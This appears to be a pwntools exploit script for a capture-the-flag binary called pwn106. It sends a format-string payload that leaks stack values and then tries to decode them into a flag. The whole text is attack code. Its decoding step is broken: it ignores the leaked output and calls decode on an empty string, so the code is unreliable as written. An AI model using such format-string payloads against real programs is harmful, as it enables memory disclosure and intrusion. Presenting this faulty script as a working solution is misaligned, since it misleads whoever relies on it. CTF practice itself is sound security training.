from pwn import *

context.binary = binary = "./pwn106user.pwn106-user"
get_flag = b"%6$lx.%7$lx.%8$lx.%9$lx.%10$lx.%11$lx"

#p = remote("10.10.120.98", 9006)
p = process()
#p.recv()
#p.recv()
p.sendline(get_flag)
output = p.recv().strip().split(b" ")[1].split(b".")
flag = ""

flag += bytes.fromhex(flag.decode("utf-8"))[::-1]

print(flag)
